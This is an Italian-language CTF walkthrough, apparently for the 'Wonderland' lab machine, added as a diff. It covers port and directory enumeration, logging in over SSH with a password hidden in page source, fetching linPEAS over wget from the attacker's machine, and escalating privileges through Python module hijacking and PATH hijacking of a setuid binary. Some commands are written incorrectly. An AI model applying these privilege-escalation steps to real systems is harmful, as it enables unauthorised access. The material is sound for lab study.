@@ -1,0 +1,171 @@
+sudo nmap -sV 10.10.159.63
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 09:53 CEST
+Nmap scan report for 10.10.159.63
+Host is up (0.23s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
+                                                              
+                                                              
+                                                              
+porta 80:
+vedo sorgente pagina, e vedo che l'img è caricata da una cartella /img
+
+http://10.10.159.63/img/
+
+ho 3 img che posso scaricare etc, niente di che
+potrei di vedere se nell'immagine ci sta qualcosa (exiftool, oppure steghide --extract -sf <img> )
+
+gobuster:
+╰─ gobuster dir -u http://10.10.159.63 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt                                      
+
+trova:
+/img
+e anche: http://10.10.159.63/r/
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.159.63
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 0] [--> img/]
+/r                    (Status: 301) [Size: 0] [--> r/]
+/poem                 (Status: 301) [Size: 0] [--> poem/] -> ho solo poemi non utili
+
+
+
+
+╰─ gobuster dir -u http://10.10.159.63/r -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.159.63/r
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/a                    (Status: 301) [Size: 0] [--> a/]
+
+quindi posso rifare la stessa cosa con /a -> vabbè arriverò a http://10.10.159.63/r/a/b/b/i/t/
+
+ctrl+u -> trovo: <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>  (user:password) (mi ci collego ssh con alice@10.10.159.63 
+
+------
+root.txt non lo posso aprire con i miei privilegi ora
+
+alice@wonderland:~$ sudo -l
+[sudo] password for alice: 
+Matching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+
+cat etc/passwd
+(ho 3 utenti)
+alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
+hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
+rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
+
+
+provo a lanciare linPeas sulla macchina (https://github.com/peass-ng/PEASS-ng/releases/tag/20240519-fab0d0d5 e poi linpeas.sh)
+sulla macchina kali:
+python3 -m http.server 9999
+
+sulla macchina target:
+wget http://10.8.107.68:9999/linpeas.sh
+
+alice@wonderland:~$ chmod +x linpeas.sh
+alice@wonderland:~$ ./linpeas.sh 
+
+
+vedo lo script .py 
+e vedo che importa random, e potrebbe capitare che se nella directory dove ho lo script py, se ho un file che si chiama random esegue quello
+e allora lo faccio un file random.py con scritto
+import os
+os.system("/bin/bash")
+
+
+poi eseguo sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py  <- per scoprire il path di python posso usare il comando: python3 -c 'import sys; print (sys.path)'
+
+e divento rabbit
+ora faccio cd .. > cd /rabbit/
+e vedo che ho un eseguibile (teaParty)
+me lo passo su kali
+---- me lo passo sempre come ho fatto prima, però al contrario cioè:
+sulla macchina target (sulla directory dove ho il file teaParty, cioè l'eseguibile):
+python3 -m http.server 9999
+
+sulla macchina kali:
+wget http://10.8.107.68:9999/teaParty e me lo trovo nella cartella in cui ho avviato wget
+
+lo analizzo con ghidra, e vedo che usa date (un path relativo però, quindi creo un file date ma prima modifico le variabili di ambiente con export /home/rabbit/$PATH$) 
+quindi apro ghidra, seleziono il progetto se richiesto, poi clicco sull'icona del drago e trascino (facendo thunar . sulla cartella contenente teaParty) teaParty in ghidra, e lo analizzo andando a selezionare il testo
+oppure cliccando nella sezione del codice con scritto **function** e a destra trovo il codice:
+
+
+void main(void)
+
+{
+  setuid(0x3eb);
+  setgid(0x3eb);
+  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
+  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R"); <-- QUI vedo che esegue date con un path relativo, e non assoluto, quindi con lo stesso principio di prima faccio un file date che dentro ha un /bin/bash e così eseguo una shell da utente che ha creato il file teaParty, cioè root (lo vedo facendo ls -la) * -> 
+  puts("Ask very nicely, and I will give you some tea while you wait for him");
+  getchar();
+  puts("Segmentation fault (core dumped)");
+  return;
+}
+
+
+* -> però prima devo mettere nelle variabili d'ambiente il path al file date "modificato", che sarà un file bash in cui scriverò:
+-----
+!/bin/bash
+
+/bin/bash
+-----
+
+rabbit@wonderland:/home/rabbit$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+devo mettere il file prima di /bin/
+
+
+poi faccio (path hijacking)
+export /home/rabbit/$PATH$
+date 
+e in date scrivo qualcosa che ci dà una shell
+poi faccio chmod +x date
+
+
+
+
+
+
+
+
+
+
+
+
+
